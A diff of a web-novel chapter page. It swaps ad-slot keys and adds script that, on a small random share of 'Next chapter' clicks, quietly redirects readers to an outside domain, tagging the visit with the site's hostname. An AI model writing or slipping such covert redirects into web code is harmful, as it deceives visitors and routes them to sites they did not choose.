@@ -2397,15 +2397,15 @@
                 <p>Margaret rose unsteadily to her feet, swaying slightly for effect. &#34;Forgive me, sir. I felt faint and collapsed. Your kindness is appreciated.&#34;</p>
                 <p>A derisive snort escaped Liam as he turned away. Margaret couldn&#39;t let this opportunity slip through her fingers. She rushed forward, tears welling in her eyes. &#34;Wait! There&#39;s more. I&#39;m being hunted by a powerful enemy. I thought... perhaps someone of your obvious stature could help. I can make it worth your while.&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Sebastian barely suppressed a laugh at the transparent ploy. Liam&#39;s expression darkened further. &#34;Do I look like the sort of fool who falls for such obvious theatrics?&#34;</p>
                 <p>Margaret&#39;s voice dropped to a whisper. &#34;My enemy controls half of Westhaven&#39;s underworld. Check my credentials - I run the largest information network in Newport. My children see everything. Need someone found? A problem disappeared? I&#39;m your woman.&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>Liam turned slowly, one eyebrow arched. &#34;Is that so?&#34;</p>
                 <p>She nodded eagerly. &#34;Just one night of protection. That&#39;s all I ask. You&#39;re clearly capable - why would I lie to someone like you?&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>Sebastian interjected quietly, &#34;Sir, we know nothing about this woman. It could be a trap.&#34;</p>
                 <p>Liam&#39;s gloved hand rose, silencing his assistant. His piercing gaze never left Margaret&#39;s face. &#34;You have exactly thirty seconds to convince me not to leave you here in the rain.&#34;</p>
                 <p>Margaret&#39;s mind raced. This was her chance. She straightened her shoulders, all pretense of weakness gone. &#34;Because I know who&#39;s been sabotaging your Royal Arch project. And I can deliver them to you on a silver platter.&#34;</p>
@@ -2532,7 +2532,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2548,8 +2548,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
